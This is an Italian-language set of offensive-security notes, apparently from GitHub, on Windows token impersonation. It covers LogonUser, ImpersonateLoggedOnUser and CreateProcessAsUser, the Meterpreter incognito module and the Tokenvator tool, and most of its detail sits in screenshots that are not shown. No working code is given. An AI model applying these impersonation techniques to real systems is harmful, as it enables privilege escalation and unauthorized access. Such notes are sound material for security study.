Link2: https://learn.microsoft.com/it-it/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera
![image](https://user-images.githubusercontent.com/110602224/200880337-5deccca4-8319-4dcc-9e91-b5ef0818fb04.png)

**Make and Impersonate Token**  
Hacker in possesso di credenziali valide possono impersonare token senza che l'utente sia loggato nel sistema sfruttando l'API di Windows [LogonUser](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonusera).  
Questa funzione crea un handle a un token che rappresenta l'utente loggato usato con [Impersonate LoggedOnUser](https://learn.microsoft.com/it-it/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser) e [CreateProcessAsUser](https://learn.microsoft.com/it-it/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera).  
![image](https://user-images.githubusercontent.com/110602224/200881513-792ad1fd-ff30-4ab4-a135-a99fedeccbd2.png)

Queste tecniche hanno diversi moduli dedicati nei framework come Metasploit.  
Meterpreter poi include un modulo chiamato _incognito_ che permette di elencare i token e di impersonare altri utenti.  
![image](https://user-images.githubusercontent.com/110602224/200881857-4dbefe28-4a51-4954-b10c-8b76b6bb69a7.png)

Il tool in .NET [Tokenvator](https://github.com/0xbadjuju/Tokenvator) si usa per manipolare i token e orientato all'alterazione dei privilegi da un processo.  
Impersonare un token non significa ereditarne per forza tutti i privilegi.  
![image](https://user-images.githubusercontent.com/110602224/200882474-cb682a5e-e57f-450d-be91-a9dbedd31cb2.png)
![image](https://user-images.githubusercontent.com/110602224/200882566-ea9157d8-b745-4956-b024-c71ef88cfcda.png)
![image](https://user-images.githubusercontent.com/110602224/200882683-9f5728f8-fa7a-4f13-bd6c-f0b73eff5c46.png)

Link: https://learn.microsoft.com/it-it/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient?redirectedfrom=MSDN
![image](https://user-images.githubusercontent.com/110602224/200882898-99bcf362-4499-4798-8ad4-948d36d88182.png)
![image](https://user-images.githubusercontent.com/110602224/200883044-f7a18b60-9b40-4f7a-8bb9-a61fdfc30926.png)
